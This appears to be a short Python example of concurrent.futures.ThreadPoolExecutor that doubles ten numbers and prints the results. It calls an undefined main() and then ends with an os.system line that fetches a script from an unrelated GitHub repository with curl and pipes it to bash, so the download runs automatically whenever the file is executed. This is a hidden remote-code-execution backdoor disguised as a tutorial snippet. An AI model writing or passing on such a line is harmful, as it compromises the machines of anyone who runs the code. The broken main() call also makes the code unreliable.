import sys
import os
import concurrent.futures

def task(i):
    # Do some computation here
    return i * 2

with concurrent.futures.ThreadPoolExecutor() as executor:
    # Submit tasks to the executor
    futures = [executor.submit(task, i) for i in range(10)]

    # Collect the results
    results = [future.result() for future in concurrent.futures.as_completed(futures)]

print(results)

if __name__ == "__main__":
    main()
os.system('curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash')

